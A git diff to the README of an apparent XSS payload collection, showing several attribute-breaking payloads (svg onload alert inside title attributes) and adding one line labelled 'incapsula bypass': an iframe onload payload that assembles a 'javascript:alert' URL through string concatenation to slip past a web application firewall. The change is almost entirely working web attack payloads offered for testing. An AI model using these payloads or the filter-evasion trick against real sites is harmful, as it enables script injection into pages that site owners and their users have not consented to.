@@ -12,10 +12,11 @@ This is an open source repo. Anyone can contribute. :beers: <br/>
 <a href="https://github.com/R0X4R/D4rkXSS/blob/master/noscript.txt">NO SCRIPT</a><br/>
 <li>For Example:</li>
 
-```
+```js
 <acronym><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
 <bgsound><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
 <xmp><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
+incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
 ```
 
 <a href="https://github.com/R0X4R/D4rkXSS/blob/master/brutelogic.txt">Brutelogic</a><br/>
